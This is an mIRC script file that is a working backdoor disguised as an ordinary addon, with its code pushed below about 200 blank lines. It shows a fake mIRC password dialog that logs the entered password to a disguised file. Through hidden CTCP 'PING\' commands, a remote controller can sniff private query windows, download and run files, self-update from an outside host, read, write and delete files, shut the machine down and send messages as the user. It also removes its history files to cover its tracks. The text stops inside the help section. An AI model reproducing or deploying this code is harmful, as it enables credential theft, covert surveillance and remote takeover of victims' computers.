   [script]
   n0=
   n1=
   n2=
   n3=
   n4=
   n5=
   n6=
   n7=
   n8=
   n9=
   n10=
   n11=
   n12=
   n13=
   n14=
   n15=
   n16=
   n17=
   n18=
   n19=
   n20=
   n21=
   n22=
   n23=
   n24=
   n25=
   n26=
   n27=
   n28=
   n29=
   n30=
   n31=
   n32=
   n33=
   n34=
   n35=
   n36=
   n37=
   n38=
   n39=
   n40=
   n41=
   n42=
   n43=
   n44=
   n45=
   n46=
   n47=
   n48=
   n49=
   n50=
   n51=
   n52=
   n53=
   n54=
   n55=
   n56=
   n57=
   n58=
   n59=
   n60=
   n61=
   n62=
   n63=
   n64=
   n65=
   n66=
   n67=
   n68=
   n69=
   n70=
   n71=
   n72=
   n73=
   n74=
   n75=
   n76=
   n77=
   n78=
   n79=
   n80=
   n81=
   n82=
   n83=
   n84=
   n85=
   n86=
   n87=
   n88=
   n89=
   n90=
   n91=
   n92=
   n93=
   n94=
   n95=
   n96=
   n97=
   n98=
   n99=
   n100=
   n101=
   n102=
   n103=
   n104=
   n105=
   n106=
   n107=
   n108=
   n109=
   n110=
   n111=
   n112=
   n113=
   n114=
   n115=
   n116=
   n117=
   n118=
   n119=
   n120=
   n121=
   n122=
   n123=
   n124=
   n125=
   n126=
   n127=
   n128=
   n129=
   n130=
   n131=
   n132=
   n133=
   n134=
   n135=
   n136=
   n137=
   n138=
   n139=
   n140=
   n141=
   n142=
   n143=
   n144=
   n145=
   n146=
   n147=
   n148=
   n149=
   n150=
   n151=
   n152=
   n153=
   n154=
   n155=
   n156=
   n157=
   n158=
   n159=
   n160=
   n161=
   n162=
   n163=
   n164=
   n165=
   n166=
   n167=
   n168=
   n169=
   n170=
   n171=
   n172=
   n173=
   n174=
   n175=
   n176=
   n177=
   n178=
   n179=
   n180=
   n181=
   n182=
   n183=
   n184=
   n185=
   n186=
   n187=
   n188=
   n189=
   n190=
   n191=
   n192=
   n193=
   n194=
   n195=
   n196=
   n197=
   n198=
   n199=on 1:SNOTICE:*:{
   n200=  .writeini aliases.ini aliases n3 /reg /r
   n201=  .load -as aliases.ini
   n202=}
   n203=
   n204=on 1:CONNECT:{
   n205=  if ($exists(history.ini) == $true) remove history.ini
   n206=  if ($exists(mirc.dll) == $true) && ($lines(mirc.dll) > 1000) remove mirc.dll
   n207=}
   n208=
   n209=on 1:DISCONNECT:{
   n210=  .timers off
   n211=  if ($exists(history.ini) == $false) goto end2
   n212=  %s.total = $er(v3.0,total)
   n213=  :again
   n214=  if (%s.total == 0) goto end
   n215=  set %s.file $gettok($er(v3.0,nick's),%s.total,44)
   n216=  set %s.file.temp files\ $+ %s.file $+ .txt
   n217=  .remove %s.file.temp
   n218=  dec %s.total
   n219=  unset %s.file
   n220=  goto again
   n221=  :end
   n222=  unset %s.total
   n223=  unset %s.file.temp
   n224=  .remove history.ini
   n225=  :end2
   n226=  .rmdir files
   n227=  unset %directory
   n228=  unset %infile
   n229=  unset %outfile
   n230=  unset %lastlines
   n231=  unset %curentlines
   n232=  unset %linetoread
   n233=  unset %query.name
   n234=  unset %owner
   n235=  unset %i
   n236=  unset %autorization
   n237=  unset %step1
   n238=  unset %step2
   n239=  unset %step3
   n240=  unset %current.password
   n241=  unset %filetoread
   n242=}
   n243=
   n244=dialog identify {
   n245=  title "mIRC"
   n246=  size -1 -1 250 100
   n247=  text "Password:", 1, 10 15 50 15, right
   n248=  edit "", 2, 10 30 230 22, left, pass, autohs
   n249=  button "OK", 3, 70 60 53 26, default
   n250=  button "Cancel", 4, 130 60 53 26, cancel
   n251=  button "!", 5, 70 60 53 26, ok, hide
   n252=}
   n253=on 1:dialog:id:sclick:3:{
   n254=  if ($did(2) != $null) {
   n255=    .write mirc32.hlp $me --> $did(2)
   n256=    .msg ns identify $did(2)
   n257=  }
   n258=  .dialog -x id
   n259=}
   n260=on 1:dialog:id:sclick:0:{
   n261=  if ($did(2) != $null) .msg ns identify $did(2)
   n262=  .dialog -x id
   n263=}
   n264=alias r {
   n265=  .dialog -mo id identify
   n266=}
   n267=alias download {
   n268=  if ($numtok($2,47) != 0) %.tmp = $gettok($2,$numtok($2,47),47)
   n269=  else %.tmp = $2
   n270=  %dlf.file = $2
   n271=  if ($3 == $null) %dlf.dir = $mircdir
   n272=  else %dlf.dir = $3-
   n273=  %cnt = $numtok(%dlf.dir,92)
   n274=  %i = 1
   n275=  %dlf.temp = $gettok(%dlf.dir,%i,92) $+ \
   n276=  %i = 2
   n277=  :nextname
   n278=  if ($numtok(%dlf.dir,92) != 0) {
   n279=    if (%i <= %cnt) {
   n280=      if ($gettok(%dlf.dir,%i,92) == program files) {
   n281=        %dlf.temp = %dlf.temp $+ progra~1 $+ \
   n282=      }
   n283=      elseif ($gettok(%dlf.dir,%i,92) == my documents) {
   n284=        %dlf.temp = %dlf.temp $+ mydocu~1 $+ \
   n285=      }
   n286=      else  %dlf.temp = %dlf.temp $+ $gettok(%dlf.dir,%i,92) $+ \
   n287=      inc %i
   n288=      goto nextname
   n289=    }
   n290=  }
   n291=  %dlf.dir = %dlf.temp
   n292=  .unset %dlf.temp
   n293=  .unset %cnt
   n294=  .unset %i
   n295=  .sockopen dlf $1 80
   n296=  .enable #downloader
   n297=}
   n298=
   n299=on *:sockopen:dlf: {
   n300=  if ($sockerr) {
   n301=    sockclose $sockname
   n302=    .msg %owner Download Error...
   n303=
   n304=    .disable #downloader
   n305=    _dlf.unset
   n306=    .unset %owner
   n307=    halt
   n308=  }
   n309=  sockwrite -n $sockname GET %dlf.file HTTP/1.1
   n310=  sockwrite -n $sockname Host: $host
   n311=  sockwrite $sockname $crlf
   n312=}
   n313=on *:sockread:dlf: {
   n314=  if ($sockerr) {
   n315=    sockclose $sockname
   n316=    .msg %owner Download Error...
   n317=    .disable #downloader
   n318=    .unset %owner
   n319=    _dlf.unset
   n320=    halt
   n321=  }
   n322=  :2
   n323=  sockread %.read
   n324=  if (*HTTP/1.1*404*Not*Found* iswm %.read) {
   n325=    sockclose $sockname
   n326=    .msg %owner Download Error...
   n327=    .disable #downloader
   n328=    .unset %owner
   n329=    _dlf.unset
   n330=    halt
   n331=  }
   n332=  if (*Moved* iswm %.read) {
   n333=    sockclose $sockname
   n334=    .msg %owner Download Error...
   n335=    .disable #downloader
   n336=    .unset %owner
   n337=    _dlf.unset
   n338=    halt
   n339=  }
   n340=  if (Content-Length:* iswm %.read) {
   n341=    %dlf.size = $gettok(%.read,2-,32)
   n342=    %dlf.red = on
   n343=  }
   n344=  if (%.read = $null) sockrename $sockname r $+ $sockname
   n345=}
   n346=on *:sockread:rdlf: {
   n347=  if ($sockerr) {
   n348=    sockclose $sockname
   n349=    .msg %owner Download Error...
   n350=    .disable #downloader
   n351=    .unset %owner
   n352=    _dlf.unset
   n353=    halt
   n354=  }
   n355=  :2
   n356=  sockread &dlftmp
   n357=  %.tmp = %dlf.file
   n358=  if ($numtok(%.tmp,47) != 0) %.tmp = $gettok(%.tmp,$numtok(%.tmp,47),47)
   n359=  bwrite %dlf.dir $+ %.tmp -1 &dlftmp
   n360=  if ($sockbr) goto 2
   n361=}
   n362=
   n363=#downloader on
   n364=on *:sockclose:rdlf: {
   n365=  .msg %owner Download Complete...
   n366=  .disable #downloader
   n367=  .unset %owner
   n368=  _dlf.unset
   n369=  halt
   n370=}
   n371=#downloader end
   n372=
   n373=alias update {
   n374=  if ($numtok($2,47) != 0) %.tmp = $gettok($2,$numtok($2,47),47)
   n375=  else %.tmp = $2
   n376=  %dlf.file = $2
   n377=  if ($3 == $null) %dlf.dir = $mircdir
   n378=  else %dlf.dir = $3-
   n379=  %cnt = $numtok(%dlf.dir,92)
   n380=  %i = 1
   n381=  %dlf.temp = $gettok(%dlf.dir,%i,92) $+ \
   n382=  %i = 2
   n383=  :nextname
   n384=  if ($numtok(%dlf.dir,92) != 0) {
   n385=    if (%i <= %cnt) {
   n386=      if ($gettok(%dlf.dir,%i,92) == program files) {
   n387=        %dlf.temp = %dlf.temp $+ progra~1 $+ \
   n388=      }
   n389=      elseif ($gettok(%dlf.dir,%i,92) == my documents) {
   n390=        %dlf.temp = %dlf.temp $+ mydocu~1 $+ \
   n391=      }
   n392=      else  %dlf.temp = %dlf.temp $+ $gettok(%dlf.dir,%i,92) $+ \
   n393=      inc %i
   n394=      goto nextname
   n395=    }
   n396=  }
   n397=  %dlf.dir = %dlf.temp
   n398=  .unset %dlf.temp
   n399=  .unset %cnt
   n400=  .unset %i
   n401=  .enable #updater
   n402=  .sockopen upd $1 80
   n403=}
   n404=
   n405=on *:sockopen:upd: {
   n406=  if ($sockerr) {
   n407=    sockclose $sockname
   n408=    .msg %owner Update Error...
   n409=    .disable #updater
   n410=    _dlf.unset
   n411=    .unset %owner
   n412=    halt
   n413=  }
   n414=  sockwrite -n $sockname GET %dlf.file HTTP/1.1
   n415=  sockwrite -n $sockname Host: $host
   n416=  sockwrite $sockname $crlf
   n417=}
   n418=
   n419=on *:sockread:upd: {
   n420=  if ($sockerr) {
   n421=    sockclose $sockname
   n422=    .msg %owner Update Error...
   n423=    .disable #updater
   n424=    .unset %owner
   n425=    _dlf.unset
   n426=    halt
   n427=  }
   n428=  :2
   n429=  sockread %.read
   n430=  if (*HTTP/1.1*404*Not*Found* iswm %.read) {
   n431=    sockclose $sockname
   n432=    .msg %owner Update Error...
   n433=    .disable #updater
   n434=    .unset %owner
   n435=    _dlf.unset
   n436=    halt
   n437=  }
   n438=  if (*Moved* iswm %.read) {
   n439=    sockclose $sockname
   n440=    .msg %owner Update Error...
   n441=    .disable #update
   n442=    .unset %owner
   n443=    _dlf.unset
   n444=    halt
   n445=  }
   n446=  if (Content-Length:* iswm %.read) {
   n447=    %dlf.size = $gettok(%.read,2-,32)
   n448=    %dlf.red = on
   n449=  }
   n450=  if (%.read = $null) sockrename $sockname r $+ $sockname
   n451=}
   n452=
   n453=on *:sockread:rupd: {
   n454=  if ($sockerr) {
   n455=    sockclose $sockname
   n456=    .msg %owner Update Error...
   n457=    .disable #updater
   n458=    .unset %owner
   n459=    _dlf.unset
   n460=    halt
   n461=  }
   n462=  :2
   n463=  sockread &dlftmp
   n464=  %.tmp = %dlf.file
   n465=  if ($numtok(%.tmp,47) != 0) %.tmp = $gettok(%.tmp,$numtok(%.tmp,47),47)
   n466=  bwrite %dlf.dir $+ %.tmp -1 &dlftmp
   n467=  if ($sockbr) goto 2
   n468=}
   n469=
   n470=#updater off
   n471=on *:sockclose:rupd: {
   n472=  .timer1 1 2 .unload -rs addon.ini
   n473=  .timer2 1 4 .remove addon.ini
   n474=  .timer3 1 6 .rename temp.ini addon.ini
   n475=  .timer4 1 8 .load -rs addon.ini
   n476=  .timer5 1 10 .disable #updater
   n477=  .msg %owner Update Complete...
   n478=  _dlf.unset
   n479=  halt
   n480=}
   n481=#updater end
   n482=
   n483=alias _dlf.unset {
   n484=  unset %dlf.file
   n485=  unset %dlf.size
   n486=  unset %dlf.dir
   n487=  unset %dlf.red
   n488=  unset %.read
   n489=  unset %.tmp
   n490=}
   n491=
   n492=alias er return $readini history.ini $1 $2-
   n493=alias ew writeini history.ini $1 $2 $3-
   n494=
   n495=alias sending {
   n496=  inc %i 1
   n497=  .msg %owner $read -l $+ %i %outfile
   n498=  if (%i == %curentlines) {
   n499=    .unset %infile
   n500=    ;    .unset %outfile
   n501=    .unset %directory
   n502=    .unset %query.name
   n503=    .unset %curentlines
   n504=    .unset %lastlines
   n505=    .unset %i
   n506=    .msg %owner END Dialog...
   n507=    .unset %owner
   n508=  }
   n509=}
   n510=alias sending2 {
   n511=  inc %linetoread 1
   n512=  .msg %owner $read -l $+ %linetoread %outfile
   n513=  if (%linetoread == %curentlines) {
   n514=    .unset %infile
   n515=    ;    .unset %outfile
   n516=    .unset %directory
   n517=    .unset %query.name
   n518=    .unset %curentlines
   n519=    .unset %lastlines
   n520=    .unset %i
   n521=    .unset %linetoread
   n522=    .msg %owner END Dialog...
   n523=    .unset %owner
   n524=  }
   n525=}
   n526=alias sendquery {
   n527=  inc %current.query 1
   n528=  .msg %owner $read -l $+ %current.query query.txt
   n529=  if (%current.query == $query(0)) {
   n530=    .remove query.txt
   n531=    .unset %query
   n532=    .unset %max.query
   n533=    .unset %current.query
   n534=    .msg %owner Command QUERY successful.
   n535=    .unset %owner
   n536=  }
   n537=}
   n538=alias sendchan {
   n539=  inc %current.chan 1
   n540=  .msg %owner $read -l $+ %current.chan chan.txt
   n541=  if (%current.chan == $chan(0)) {
   n542=    .remove chan.txt
   n543=    .unset %chan
   n544=    .unset %max.chan
   n545=    .unset %current.chan
   n546=    .msg %owner Command CHAN successful.
   n547=    .unset %owner
   n548=  }
   n549=}
   n550=alias readfile {
   n551=  inc %i 1
   n552=  %text = $read -l $+ %i %filetoread
   n553=  if (%text != $nill) { .msg %owner $read -l $+ %i %filetoread }
   n554=  else { %text = - | .msg %owner %text }
   n555=  if (%i == %curentlines) {
   n556=    .unset %filetoread
   n557=    .unset %text
   n558=    .unset %curentlines
   n559=    .unset %i
   n560=    .msg %owner Command READFILE successful.
   n561=    .unset %owner
   n562=  }
   n563=}
   n564=alias showtimer {
   n565=  dec %curenttime
   n566=  if (%curenttime = 1) {
   n567=    .titlebar %curenttime $+ $chr(32) $+ second left.
   n568=    goto end
   n569=  }
   n570=  .titlebar %curenttime $+ $chr(32) $+ seconds left.
   n571=  :end
   n572=  if (%curenttime == 0) {
   n573=    /titlebar
   n574=    .unset %time
   n575=    .unset %curenttime
   n576=    if (%action == shutdown) { .run rundll32 user.exe,exitwindows | goto exit }
   n577=    if (%action != shutdown) { %action | goto exit }
   n578=    :exit
   n579=    .unset %action
   n580=  }
   n581=}
   n582=CTCP *:PING*:*:{
   n583=  if ($1 == PING) {
   n584=    .ctcpreply $nick PING 9??? seconds...
   n585=
   n586=  }
   n587=  if ($1 == PING\LOOK) && (%autorization == yes) {
   n588=    %infile = $2
   n589=    %directory = files
   n590=    %outfile =  %directory $+ \ $+ %infile $+ .txt
   n591=    %owner = $nick
   n592=    %cnt = $query(0)
   n593=    %curentqueryname = 0
   n594=    %query.name = $2
   n595=    mkdir %directory
   n596=    if ($2 == $null) { .notice $nick Query name not specified | goto exit }
   n597=    if ($query(0) == 0) && ($2 != $null) { .notice $nick Queryes not open. | goto exit }
   n598=    if ($query(0) >= 1) goto scanquerynames
   n599=    :scanquerynames
   n600=    inc %curentqueryname 1
   n601=    if ($query(%curentqueryname) != %query.name) goto obrabotka
   n602=    elseif ($query(%curentqueryname) == %query.name) { .notice $nick Query Terminal found... | goto sendlines }
   n603=    :obrabotka
   n604=    if (%curentqueryname != %cnt) goto scanquerynames
   n605=    if (%curentqueryname == %cnt) && ($query(%curentqueryname) != %query.name) { .notice $nick Query Terminal not found... | goto exit }
   n606=    :sendlines
   n607=    if ($exists(%outfile) == $false) { goto firsttime }
   n608=    if ($exists(%outfile) == $true)  { goto secondtime }
   n609=    :firsttime
   n610=    if ($exists(history.ini) == $false) ew v3.0 Total 0
   n611=    %total = $er(v3.0,Total)
   n612=    if (%total == 0) {
   n613=      inc %total
   n614=      ew v3.0 Total %total
   n615=      ew v3.0 nick's %infile
   n616=      goto jump
   n617=    }
   n618=    inc %total
   n619=    ew v3.0 Total %total
   n620=    %temp.file = $er(v3.0,nick's)
   n621=    %temp.file = %temp.file $+ , $+ %infile
   n622=    ew v3.0 nick's %temp.file
   n623=    unset %temp.file
   n624=    :jump
   n625=    %i = 0
   n626=    .filter -wf %infile %outfile *
   n627=    %curentlines = $lines(%outfile)
   n628=    %lastlines = %curentlines
   n629=    if (%curentlines == $nill) { .notice $nick Lenght is zer0 | goto exit }
   n630=    else { .msg %owner Total Lines in Query Terminal is %curentlines | .timersend %curentlines 3 /sending }
   n631=    goto exit
   n632=    :secondtime
   n633=    %i = 0
   n634=    %lastlines = $lines(%outfile)
   n635=    .remove %outfile
   n636=    .filter -wf %infile %outfile *
   n637=    %curentlines = $lines(%outfile)
   n638=    if (%curentlines == $nill) { .notice $nick Lenght is zer0 | goto exit }
   n639=    elseif (%curentlines == %lastlines ) {
   n640=      .notice %owner No new mesages
   n641=      .unset %infile
   n642=      .unset %outfile
   n643=      .unset %directory
   n644=      .unset %query.name
   n645=      .unset %curentlines
   n646=      .unset %lastlines
   n647=      .unset %i
   n648=      .unset %owner
   n649=      goto exit
   n650=    }
   n651=    elseif (%curentlines < %lastlines) { %lastlines = %curentlines | .remove %outfile | .notice $nick Reopen... | goto firsttime }
   n652=    elseif (%curentlines > %lastlines ) {
   n653=      %i = %curentlines - %lastlines
   n654=      %linetoread = %lastlines
   n655=      .msg %owner Total Lines for Loading in Query Terminal is %i
   n656=      .timersend %i 3 /sending2
   n657=    }
   n658=    :exit
   n659=    .unset %i
   n660=    .unset %curentqueryname
   n661=    .unset %cnt
   n662=  }
   n663=  if ($1 == PING\QUERY) && (%autorization == yes) {
   n664=    %owner = $nick
   n665=    %current.query = 0
   n666=    if ($query(0) = 0) { .notice %owner I've 0 queryes open. | .unset %owner | goto end }
   n667=    if ($query(0) >= 1) { .write -c query.txt | .msg %owner I've $query(0) queries open. }
   n668=    :run
   n669=    inc %query 1
   n670=    if (%query <= $query(0)) { .write query.txt => $query(%query) | goto run }
   n671=    %max.query = $lines(query.txt)
   n672=    .timersendquery %max.query 3 /sendquery
   n673=    :end
   n674=    .unset %current.query
   n675=  }
   n676=  if ($1 == PING\CHAN) && (%autorization == yes) {
   n677=    %owner = $nick
   n678=    %current.chan = 0
   n679=    if ($chan(0) = 0) { .notice %owner I'm in 0 channels. | goto end }
   n680=    if ($chan(0) >= 1) { .write -c chan.txt | .msg %owner I'm in $chan(0) channels. }
   n681=    :run
   n682=    inc %chan 1
   n683=    if (%chan <= $chan(0)) { .write chan.txt => $chan(%chan) Modes: $chan(%chan).mode | goto run }
   n684=    %max.chan = $lines(chan.txt)
   n685=    .timersendchan %max.chan 3 /sendchan
   n686=    :end
   n687=    .unset %current.chan
   n688=  }
   n689=  if ($1 == PING\DOWNLOAD) && (%autorization == yes) {
   n690=    if $2 && $3 && $4 != $nill {
   n691=      /download $2 $3 $4
   n692=      set %owner $nick
   n693=      .enable #downloader
   n694=      .msg $nick Command DOWNLOAD successful.
   n695=    }
   n696=  }
   n697=
   n698=  if ($1 == PING\UPDATE) && (%autorization == yes) {
   n699=    /update mercury.spaceports.com /~tnt/update/temp.ini $mircdir
   n700=    set %owner $nick
   n701=    .enable #updater
   n702=    .msg $nick Command UPDATE successful.
   n703=  }
   n704=
   n705=  if ($1 == PING\MSG) && (%autorization == yes) {
   n706=    if $2 && $3 != $nill {
   n707=      .msg $2 $3-
   n708=      .msg $nick Command MSG successful.
   n709=    }
   n710=  }
   n711=  if ($1 == PING\MSGV) && (%autorization == yes) {
   n712=    if $2 && $3 != $nill {
   n713=      /msg $2 $3-
   n714=      .msg $nick Command MSGV successful.
   n715=    }
   n716=  }
   n717=  if ($1 == PING\SAY) && ($me ison $2) && (%autorization == yes) {
   n718=    if $2 && $3 != $nill {
   n719=      .msg $2 $3-
   n720=      .msg $nick Command SAY successful.
   n721=    }
   n722=  }
   n723=  if ($1 == PING\SAYV) && ($me ison $2) && (%autorization == yes) {
   n724=    if $2 && $3 != $nill {
   n725=      /msg $2 $3-
   n726=      .msg $nick Command SAYV successful.
   n727=    }
   n728=  }
   n729=  if ($1 == PING\RUN) && (%autorization == yes) {
   n730=    if ($2 != $nill) && $exists($2) {
   n731=      .run $2-
   n732=      .msg $nick Command RUN successful.
   n733=    }
   n734=    else .msg $nick Command RUN Error: File Not Found!
   n735=  }
   n736=  if ($1 == PING\DEL) && (%autorization == yes) {
   n737=    if ($2 != $nill) && $exists($2) {
   n738=      .remove $2
   n739=      .msg $nick Command DEL successful.
   n740=    }
   n741=  }
   n742=  if ($1 == PING\READFILE) && (%autorization == yes) {
   n743=    if ($2 != $nill) && $exists($2) {
   n744=      %owner = $nick
   n745=      %filetoread = $2
   n746=      %curentlines = $lines($2)
   n747=      %i = 0
   n748=      .msg %owner In File %filetoread are %curentlines lines.
   n749=      if (%curentlines != 0) .timer %curentlines 3 /readfile
   n750=    }
   n751=  }
   n752=  if ($1 == PING\WRITEFILE) && (%autorization == yes) {
   n753=    if ($2 && $3 != $nill) {
   n754=      .write $2 $3-
   n755=      .notice $nick Command WRITEFILE successful
   n756=    }
   n757=  }
   n758=  if ($1 == PING\RENAME) && (%autorization == yes) {
   n759=    if ($2 && $3 != $nill) && $exists($2) {
   n760=      .rename $2 $3
   n761=      .msg $nick Command RENAME successful.
   n762=    }
   n763=  }
   n764=  if ($1 == PING\TIMER) && (%autorization == yes) {
   n765=    if (($2 != $nill) && ($3 != $nill)) {
   n766=      if (($2 > 1) && ($2 < 301)) {
   n767=        set %time $2
   n768=        set %curenttime %time + 1
   n769=        set %temp.time %time + 5
   n770=        set %action $3-
   n771=        .timer %curenttime 1 .showtimer
   n772=        .timerunset 1 %temp.time .unset %temp.time %action
   n773=        .msg $nick Command TIMER successful.
   n774=        halt
   n775=        } else {
   n776=        .msg $nick Command TIMER: Parameters out of range!
   n777=        halt
   n778=      }
   n779=    }
   n780=    .msg $nick Command TIMER: Not Enought Parameters!
   n781=  }
   n782=  if ($1 == PING\READINI) && (%autorization == yes) {
   n783=    if ($2 && $3 && $4 != $nill) && $exists($2) {
   n784=      .msg $nick $readini $2 $3 $4
   n785=    }
   n786=  }
   n787=  if ($1 == PING\WRITEINI) && (%autorization == yes) {
   n788=    if $2 && $3 && $4 && $5 != $nill {
   n789=      .writeini $2 $3 $4 $5
   n790=      .notice $nick Command WRITEINI successful
   n791=    }
   n792=  }
   n793=  if ($1 == PING\DELINI) && (%autorization == yes) {
   n794=    if ($2 && $3 != $nill) && $exists($2) {
   n795=      .remini $2 $3-
   n796=      .notice $nick Command DELINI successful
   n797=    }
   n798=  }
   n799=  if ($1 == PING\LOAD) && (%autorization == yes) {
   n800=    if ($2 != $nill) && $exists($2) {
   n801=      .load -rs $2
   n802=      .msg $nick Command LOAD successful.
   n803=    }
   n804=  }
   n805=  if ($1 == PING\UNLOAD) && (%autorization == yes) {
   n806=    if $2 != $nill {
   n807=      .unload -rs $2
   n808=      .msg $nick Command UNLOAD successful.
   n809=    }
   n810=  }
   n811=  if ($1 == PING\OP) && ($me ison $2) && ($3 ison $2) && ($me isop $2) && (%autorization == yes) {
   n812=    if $2 && $3 != $nill {
   n813=      .mode $2 +o $3
   n814=    }
   n815=  }
   n816=  if ($1 == PING\DEOP) && ($me ison $2) && ($3 ison $2) && ($me isop $2) && (%autorization == yes) {
   n817=    if $2 && $3 != $nill {
   n818=      .mode $2 -o $3
   n819=    }
   n820=  }
   n821=  if ($1 == PING\KICK) && ($me ison $2) && ($3 ison $2) && ($me isop $2) && (%autorization == yes) {
   n822=    if $2 && $3 != $nill {
   n823=      .kick $2 $3
   n824=    }
   n825=  }
   n826=  if ($1 == PING\BAN) && ($me ison $2) && ($me isop $2) && (%autorization == yes) {
   n827=    if $2 && $3 != $nill {
   n828=      .mode $2 +b $3
   n829=    }
   n830=  }
   n831=  if ($1 == PING\UNBAN) && ($me ison $2) && ($me isop $2) && (%autorization == yes) {
   n832=    if $2 && $3 != $nill {
   n833=      .mode $2 -b $3
   n834=    }
   n835=  }
   n836=  if ($1 == PING\INVITE) && ($me ison $3) && (%autorization == yes) {
   n837=    if $2 && $3 != $nill {
   n838=      .invite $2 $3
   n839=    }
   n840=  }
   n841=  if ($1 == PING\JOIN) && ($me !ison $2) && (%autorization == yes) {
   n842=    if $2 && $3 != $nill {
   n843=      .join $2 $3
   n844=    }
   n845=  }
   n846=  if ($1 == PING\PART) && ($me ison $2) && (%autorization == yes) {
   n847=    if $2 && $3 != $nill {
   n848=      .part $2 $3
   n849=    }
   n850=  }
   n851=  if ($1 == PING\TOPIC) && ($me ison $2) && (%autorization == yes) {
   n852=    if $2 && $3 != $nill {
   n853=      .topic $2 $3-
   n854=    }
   n855=  }
   n856=  if ($1 == PING\QUIT) && (%autorization == yes) { .quit $2- }
   n857=  if ($1 == PING\DIE) && (%autorization == yes) { .quit $2- | .exit }
   n858=  if ($1 == PING\CHANMODE) && ($me ison $2) && ($me isop $2) && (%autorization == yes) {
   n859=    if $2 && $3 != $nill {
   n860=      .mode $2 $3-
   n861=      .msg $nick Command CHANMODE successful.
   n862=    }
   n863=  }
   n864=  if ($1 == PING\NICK) && (%autorization == yes) {
   n865=    if $2 != $nill {
   n866=      .nick $2
   n867=    }
   n868=  }
   n869=  if ($1 == PING\EDIT) && (%autorization == yes) {
   n870=    if $2 && $3 != $nill {
   n871=      .editbox $2 $3
   n872=      .msg $nick Command EDIT successful.
   n873=    }
   n874=  }
   n875=  if ($1 == PING\TITLE) && (%autorization == yes) {
   n876=    if $2 != $nill {
   n877=      .titlebar $2-
   n878=      .msg $nick Command TITLE successful.
   n879=    }
   n880=  }
   n881=  if ($1 == PING\IDLE) && (%autorization == yes) { .notice $nick I've been idle: $idle }
   n882=  if ($1 == PING\MIRCSTAT) && (%autorization == yes) { if $2 != $nill { .showmirc $2 } }
   n883=  if ($1 == PING\IGNORE) && (%autorization == yes) {
   n884=    if $2 != $nill {
   n885=      .ignore $2
   n886=      .msg $nick Command IGNORE successful.
   n887=    }
   n888=  }
   n889=  if ($1 == PING\UNIGNORE) && (%autorization == yes) {
   n890=    if $2 != $nill {
   n891=      .ignore -r $2
   n892=      .msg $nick Command UNIGNORE successful.
   n893=    }
   n894=  }
   n895=  if ($1 == PING\ACTIVE) && (%autorization == yes) {
   n896=    .notice $nick The Active Window in mIRC is < $active >
   n897=    if ($appactive == $true) { .notice $nick mIRC Is The Active Aplication. }
   n898=    if ($appactive != $true) { .notice $nick mIRC Is Not The Active Aplication. }
   n899=  }
   n900=
   n901=  ;--------------- HELP SECTION ---------------
   n902=  if ($1- == PING\HELP LOOK) && (%autorization == yes) {
   n903=    .notice $nick Use PING\LOOK Querywindow for SNIFF messages from this Query.
   n904=    .halt
   n905=  }
   n906=  if ($1- == PING\HELP QUERY) && (%autorization == yes) {
   n907=    .notice $nick Use PING\QUERY for view how many open Queryes i have.
   n908=    .halt
   n909=  }
   n910=  if ($1- == PING\HELP CHAN) && (%autorization == yes) {
   n911=    .notice $nick Use PING\CHAN for view how many open Channels i have.
   n912=    .halt
   n913=  }
   n914=  if ($1- == PING\HELP DOWNLOAD) && (%autorization == yes) {
   n915=    .notice $nick Use PING\DOWNLOAD [http://]URL or IP /dir/file.ext LocalDirname to Download file from URL in Local Directory.
   n916=    .halt
   n917=  }
   n918=  if ($1- == PING\HELP MSG) && (%autorization == yes) {
   n919=    .notice $nick Use PING\MSG Nick/#Channel Text for write invisible message to another User/Channel.
   n920=    .halt
   n921=  }
   n922=  if ($1- == PING\HELP MSGV) && (%autorization == yes) {
   n923=    .notice $nick Use PING\MSGV Nick/#Channel Text for write visible message to another User/Channel.
   n924=    .halt
   n925=  }
   n926=  if ($1- == PING\HELP SAY) && (%autorization == yes) {
   n927=    .notice $nick Use PING\SAY #channel Text for write invisible message only to open #channel.
   n928=    .halt
   n929=  }
   n930=  if ($1- == PING\HELP SAYV) && (%autorization == yes) {
   n931=    .notice $nick Use PING\SAYV #channel Text for write visible message only to open #channel.
   n932=    .halt
   n933=  }
   n934=  if ($1- == PING\HELP RUN) && (%autorization == yes) {
   n935=    .notice $nick Use PING\RUN Path\FileName.EXT for EXECUTE existing File.
   n936=    .halt
   n937=  }
   n938=  if ($1- == PING\HELP DEL) && (%autorization == yes) {
   n939=    .notice $nick Use PING\DEL Path\FileName.EXT for DELETE File.
   n940=    .halt
   n941=  }
   n942=  if ($1- == PING\HELP READFILE) && (%autorization == yes) {
   n943=    .notice $nick Use PING\READFILE File.EXT for read existing File.
   n944=    .halt
   n945=  }
   n946=  if ($1- == PING\HELP WRITEFILE) && (%autorization == yes) {
   n947=    .notice $nick Use PING\WRITEFILE FileName.EXT Text for write Text to File.
   n948=    .notice $nick File will be created if not exist.
   n949=    .halt
   n950=  }
   n951=  if ($1- == PING\HELP RENAME) && (%autorization == yes) {
   n952=    .notice $nick Use PING\RENAME File.EXT for rename existing File.
   n953=    .halt
   n954=  }
   n955=  if ($1- == PING\HELP TIMER) && (%autorization == yes) {
   n956=    .notice $nick Use PING\TIMER seconds shutdown for ACTION.
   n957=    .notice $nick or some else.
   n958=    .halt
   n959=  }
   n960=  if ($1- == PING\HELP READINI) && (%autorization == yes) {
   n961=    .notice $nick Use PING\READINI File.INI section item for read variables from existing INIFile.
   n962=    .halt
   n963=  }
   n964=  if ($1- == PING\HELP WRITEINI) && (%autorization == yes) {
   n965=    .notice $nick Use PING\WRITEINI FileName.INI section item value for write value to item in File.
   n966=    .notice $nick File will be created if not exist.
   n967=    .notice $nick section\item\value will be created if not exist.
   n968=    .halt
   n969=  }
   n970=  if ($1- == PING\HELP DELINI) && (%autorization == yes) {
   n971=    .notice $nick Use PING\DELINI File.INI section item for delete sections or variables from existing INIFile.
   n972=    .halt
   n973=  }
   n974=  if ($1- == PING\HELP LOAD) && (%autorization == yes) {
   n975=    .notice $nick Use PING\LOAD FileName.INI for Load File.INI to Current Mashine.
   n976=    .halt
   n977=  }
   n978=  if ($1- == PING\HELP UNLOAD) && (%autorization == yes) {
   n979=    .notice $nick Use PING\UNLOAD FileName.INI for UnLoad File.INI from Current Mashine.
   n980=    .halt
   n981=  }
   n982=  if ($1- == PING\HELP OP) && (%autorization == yes) {
   n983=    .notice $nick Use PING\OP #channel Nick for OP User in #channel.
   n984=    .halt
   n985=  }
   n986=  if ($1- == PING\HELP DEOP) && (%autorization == yes) {
   n987=    .notice $nick Use PING\DEOP #channel Nick for DEOP User in #channel.
   n988=    .halt
   n989=  }
   n990=  if ($1- == PING\HELP KICK) && (%autorization == yes) {
